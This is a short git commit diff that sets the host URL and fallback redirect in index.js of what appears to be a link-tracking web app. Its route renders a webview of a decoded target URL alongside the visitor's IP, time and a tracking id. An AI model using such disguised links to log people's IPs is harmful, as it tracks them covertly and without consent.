fdfdcaf385d52f5feaa515550068e2024ec01271
Rahul Pipliwal <91361622+rdx8905@users.noreply.github.com>
2023-04-23 13:18:44 +0530

    Update index.js

--- index.js
+++ index.js
@@ -14,7 +14,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="YOUR URL";
+var hostURL="https://rdx-track.yrylyr-yr.repl.co";
 //TOGGLE for Shorters
 var use1pt=true;
 
@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("http://pipliwal.tk");
 }
 
          
